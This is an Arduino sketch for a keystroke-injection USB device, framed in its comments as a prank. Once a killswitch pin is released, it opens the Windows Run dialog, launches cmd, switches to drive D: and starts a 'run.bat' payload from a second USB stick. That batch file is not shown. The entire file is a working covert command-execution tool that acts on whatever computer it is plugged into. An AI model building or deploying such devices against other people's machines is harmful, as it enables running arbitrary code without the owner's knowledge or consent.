#include <Keyboard.h>

int Killswitch = 2;       // It's recommended to solder a jumper to Pin 2 to prevent triggering during programming

void setup() 
{
  pinMode(Killswitch, INPUT_PULLUP);
  Keyboard.begin();
}

void loop() 
{
  while(digitalRead(Killswitch) == HIGH)
  {
    delay(500);
  }
  Keyboard.press(KEY_LEFT_GUI); //Press Windows Key
  Keyboard.press('r');          //Press r key
  delay(100);
  Keyboard.releaseAll();        // Release keys after "run" is launched
  Keyboard.println("cmd");      // Lanch cmd
  delay(500);                   // Wait for cmd to start up (Increase if you're using Potato PCs)
  // Lanch run.bat (For now it's optimized for the use with a seperate USB stick to launch the payload)
  Keyboard.print("D");              // Type USB drive letter into cmd
  Keyboard.press(KEY_LEFT_SHIFT);   // Press Shift 
  Keyboard.press('.');              // Type ":" into cmd
  delay(100);
  Keyboard.releaseAll();
  Keyboard.println("run.bat");      //start run.bat
  delay(1000);    // Your time to laugh as you just scared your friend
}
